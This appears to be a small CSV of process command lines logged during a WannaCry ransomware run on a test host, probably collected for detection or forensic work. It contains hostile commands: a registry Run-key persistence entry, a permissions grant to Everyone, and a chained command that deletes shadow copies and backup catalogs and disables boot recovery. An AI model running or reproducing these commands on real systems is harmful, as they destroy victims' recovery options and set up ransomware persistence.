,command_line
0,272271556512340.bat
1,"cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""hhggqntuvd827"" /t REG_SZ /d ""\""C:\Users\Victima2\AppData\Local\Temp\tasksche.exe\"""" /f"
2,taskdl.exe
3,taskse.exe C:\Users\Victima2\AppData\Local\Temp\@WanaDecryptor@.exe
4,@WanaDecryptor@.exe  vs
5,"reg  add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""hhggqntuvd827"" /t REG_SZ /d ""\""C:\Users\Victima2\AppData\Local\Temp\tasksche.exe\"""" /f"
6,icacls . /grant Everyone:F /T /C /Q
7,cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
8,attrib +h .
9,cscript.exe  //nologo m.vbs
10,@WanaDecryptor@.exe
11,@WanaDecryptor@.exe co
12,cmd.exe /c start /b @WanaDecryptor@.exe vs
